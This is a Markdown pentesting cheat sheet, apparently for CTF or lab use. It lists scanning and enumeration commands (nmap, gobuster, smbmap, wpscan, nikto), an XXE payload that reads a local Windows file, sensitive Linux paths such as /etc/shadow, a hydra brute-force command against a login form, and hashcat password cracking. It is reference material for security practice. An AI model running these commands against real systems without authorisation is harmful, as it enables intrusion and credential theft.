Scanning
========

Rustscan
--------

Scan an IP:
```
rustscan -a $RHOSTS --ulimit 5000
```

Nmap
----

Scan TCP Ports:
```
nmap -sV $RHOSTS
```
	
Scan TCP ports and run scripts against open ports:
```
nmap -sV -sC $RHOSTS
```
	
Scan UDP ports and run scriptions against open ports:
```
sudo nmap -sU -sC $RHOSTS
```

nmap ignore firewall
```
nmap -sC -Pn $RHOSTS
```

Scan for smb vulns
```
nmap --script smb-vuln* -p 445 -oA nmap/smv_vuln $RHOSTS
```

CURL
----

Send HEAD request to IP:80
```
curl -I http://$RHOST/
```

GoBuster
--------

Quick scan of URL
```
gobuster dir --wordlist ~/user/share/seclists/Discovery/Web-Content/common.txt --url $RURL
```

Moderately thurough scan
```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url $RURL
```

Scan for PHP paths
```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -e -s "200,301,302,401" -x "php" -t 100 --url $RURL
```

SMBClient
---------

Identifying open shares with directory listing:
```
while read i; do smbmap -H $i 2>/dev/null; done < <Target IP File> | grep -v Finding | grep -v Authentication
```

Vulnerable XML through external entities
```
Vulnerable XML:
	<!DOCTYPE root [<!ENTITY test SYSTEM "c:/windows/win.ini"> ]>
	...
	&test;
	...
```

Crypto
------

Check a public key
```
openssl rsa -noout -text -inform PEM -in Weak\ RSA/key.pub -pubin
```

Break RSA
```
cd ~/RsaCtfTool
python3 RsaCtfTool.py
```

Understand files
----------------

Discover the type of a file
```
file {filename}
```

Discover file that contains other magic numbers
```
binwalk --signature --term {filename}
```

WPScan
------

```
sudo gem install wpscan
wpscan --url $URL --detection-mode aggressive
```

General Vulnerability Scan
--------------------------
```
nikto --host $URL
```

Useful Linux Paths
------------------

```
/etc/passwd
/etc/shadow
/etc/crontab
```

Bruteforce a login page
-----------------------

[Guide](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)

```
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt $RHOST http-post-form "/login.php:username=admin&password=^PASS^:Invalid Username or Password"
---

Reverse a hash
--------------

```
echo "{salt}" > hash
hashcat -a 0 -m 500 hash /usr/share/wordlists/rockyou.txt
```

GDB
---

Check security on a binary
```
checksec $file
```